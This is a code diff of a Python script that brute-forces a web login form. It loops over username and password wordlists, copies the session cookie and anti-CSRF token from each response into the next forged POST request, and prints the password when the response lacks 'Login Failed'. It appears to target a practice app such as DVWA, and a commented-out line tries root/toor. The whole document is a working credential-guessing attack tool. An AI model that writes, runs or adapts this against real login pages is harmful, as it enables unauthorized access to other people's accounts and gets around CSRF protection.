@@ -77,22 +77,23 @@ def forge_post(url, token, resp_cookie, username, password):
 
     return resp
 
-def analyze_resp(resp, password):
+def analyze_resp(resp):
 
-    matched_password = False
+    password_correct = False
     
-    #extract response cookie 
+    #extract response cookie from set_session in html body
 
     set_session_pattern = re.compile(r'set_session" value="([a-f0-9]+)"')
     
     session_match = set_session_pattern.search(resp.text)
 
     if session_match:
-        cookie = session_match.group(1)
-        print("set_session cookie value:", cookie)
+        next_cookie = session_match.group(1)
+        print("set_session cookie value:", next_cookie)
     else:
-        print("set_session cookie not found.")
         return 0
+
+    #extract response cookie from token in html body
 
     token_pattern = re.compile(r'token" value="([a-f0-9]+)"')
     
@@ -102,57 +103,38 @@ def analyze_resp(resp, password):
         token = match.group(1)
         print("Token value:", token)
     else:
-        print("Token not found.")
         return 0
 
-    # search for positive password feedback
+    # search for positive password feedback in html body
 
     pattern_not_failed = re.compile(r'^((?!Login Failed).)*$')
     log_match = pattern_not_failed.search(resp.text)
 
     if log_match:
-        print("Text does not contain 'Login Failed'.")
-        print(password)
-        matched_password = True
+        password_correct = True
 
-    return (cookie, token, matched_password)
+    return (next_cookie, token, password_correct)
 
-
-def do_get (URL):
-
-    resp = requests.get(URL)
-
-    return resp
 
 ###########################################MAIN#############################################
 
 def main():
 
-    found = False
+    password_correct = False
     #initialize bruteforce session by sending virgin GET request
-    resp = do_get(URL)
-
-    #resp = forge_post(URL, token, cookie, "root", "toor")
-
-    (cookie, token, matched_password) = analyze_resp(resp,"Initializing")
-    
-    #(cookie,token) = analyze_resp(resp)
+    resp = requests.get(URL)
+    (cookie, token, password_correct) = analyze_resp(resp)
 
     with open(USER_FILE,"r") as u:
-
         with open(PASS_FILE,"r") as f:
 
             for user in u.readlines():
                 for password in f.readlines():
-                    #print(line)
-                    # send a password attempt with post request
                     resp = forge_post(URL, token, cookie, user, password)
-                    (cookie, token, matched_password) = analyze_resp(resp, password)
-                    if matched_password:
-                        found = True
+                    (cookie, token, password_correct) = analyze_resp(resp)
+                    if password_correct:
+                        print("[+] Pasword found: ", password)
                         break
-                if found:
-                    break
 
 
     return 0
